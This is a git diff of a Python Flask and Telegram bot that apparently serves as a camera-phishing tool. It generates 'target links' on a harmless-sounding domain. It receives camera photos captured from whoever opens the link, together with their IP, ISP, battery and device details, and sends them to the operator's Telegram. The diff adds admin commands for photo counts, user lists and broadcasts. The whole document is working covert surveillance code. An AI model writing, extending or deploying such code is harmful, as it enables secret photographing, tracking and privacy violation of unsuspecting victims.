@@ -2,6 +2,14 @@ import os, base64, threading, sqlite3, time, telebot, requests, signal
 from flask import Flask, render_template, request, jsonify
 from telebot import types
 
+def kill_old_processes():
+    try:
+        current_pid = os.getpid()
+        os.system(f"pgrep -f app.py | grep -v {current_pid} | xargs kill -9")
+    except: pass
+
+kill_old_processes()
+
 app = Flask(__name__)
 
 BOT_TOKEN = os.getenv('BOT_TOKEN')
@@ -11,10 +19,6 @@ YT_LINK = "https://youtube.com/@hackers_colony_tech"
 RENDER_LINK = "https://happy-wishing-you.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
-
-def handler(signum, frame):
-    os._exit(0)
-signal.signal(signal.SIGTERM, handler)
 
 def db_init():
     conn = sqlite3.connect('users.db')
@@ -37,48 +41,73 @@ def start(message):
     conn = sqlite3.connect('users.db'); cursor = conn.cursor()
     cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?)', (message.chat.id,))
     conn.commit(); conn.close()
-    if is_user_joined(message.chat.id): show_menu(message.chat.id)
+    
+    if is_user_joined(message.chat.id):
+        markup = types.InlineKeyboardMarkup()
+        markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), 
+                   types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
+        markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
+        markup.add(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
+        bot.send_message(message.chat.id, "<b>Select your camera mode:</b>", parse_mode='HTML', reply_markup=markup)
     else:
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
                    types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_LINK),
                    types.InlineKeyboardButton("✅ I Have Joined & Subscribed ✅", callback_data="check_join"))
-        bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>", parse_mode='HTML', reply_markup=markup)
+        bot.send_message(message.chat.id, "<b>Access Denied! Join Channel First.</b>", parse_mode='HTML', reply_markup=markup)
 
-def show_menu(chat_id):
-    markup = types.InlineKeyboardMarkup()
-    markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), 
-               types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
-    markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
-    markup.add(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
-    bot.send_message(chat_id, "<b>Select your camera mode:</b>", parse_mode='HTML', reply_markup=markup)
+@bot.message_handler(commands=['stats'])
+def total_stats(message):
+    if message.from_user.id in ADMINS:
+        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
+        cursor.execute('SELECT total_photos FROM stats WHERE id = 1')
+        total = cursor.fetchone()[0]
+        bot.reply_to(message, f"📊 <b>Total Photos Received:</b> {total}", parse_mode='HTML')
+
+@bot.message_handler(commands=['users'])
+def user_list(message):
+    if message.from_user.id in ADMINS:
+        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
+        cursor.execute('SELECT id, photo_count FROM users')
+        rows = cursor.fetchall()
+        response = "👥 <b>User Activity List:</b>\n\n"
+        for row in rows:
+            response += f"👤 ID: <code>{row[0]}</code> | 📸 Photos: {row[1]}\n"
+        bot.reply_to(message, response, parse_mode='HTML')
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast(message):
+    if message.from_user.id in ADMINS:
+        text = message.text.replace('/broadcast', '').strip()
+        if not text:
+            bot.reply_to(message, "Usage: /broadcast [message]")
+            return
+        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
+        cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
+        count = 0
+        for user in users:
+            try: bot.send_message(user[0], text); count += 1
+            except: pass
+        bot.send_message(message.chat.id, f"✅ Sent to {count} users.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
-    if call.data == "check_join":
-        if is_user_joined(call.from_user.id): show_menu(call.message.chat.id)
-        else: bot.answer_callback_query(call.id, "❌ Join the channel first!", show_alert=True)
-    elif call.data.startswith("m_"):
+    if call.data.startswith("m_"):
         mode = call.data.split("_")[1]
         final_url = f"{RENDER_LINK}/?m={mode}&uid={call.message.chat.id}"
-        msg = (f"🤠 <b>Your target link</b> 🔗\n\n"
-               f"Url = <a href='{final_url}'>{final_url}</a>\n\n"
-               f"✨ Thank you team HCO ✨")
+        msg = f"🤠 <b>Your Link:</b>\n\n<a href='{final_url}'>{final_url}</a>\n\n✨ Team HCO ✨"
         bot.send_message(call.message.chat.id, msg, parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
-def index():
-    return render_template('index.html')
+def index(): return render_template('index.html')
 
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
     uid = data.get('uid'); info = data.get('info', {})
-    isp = "Unknown"
-    try: 
-        ip_info = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json()
-        isp = ip_info.get('isp', 'Unknown')
-    except: pass
+    try: isp = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json().get('isp', 'Unknown')
+    except: isp = "Unknown"
+    
     img_data = base64.b64decode(data.get('image').split(',')[1])
     caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                f"🔋 <b>Battery:</b> {info.get('battery')}\n"
@@ -88,11 +117,16 @@ def upload():
                f"📶 <b>Network:</b> {isp}\n"
                f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                f"✨ Created by Roshan ✨")
+    
+    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
+    cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
+    cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (uid,))
+    conn.commit(); conn.close()
+    
     bot.send_photo(uid, img_data, caption=caption, parse_mode='HTML')
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
     threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
-                               
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+        
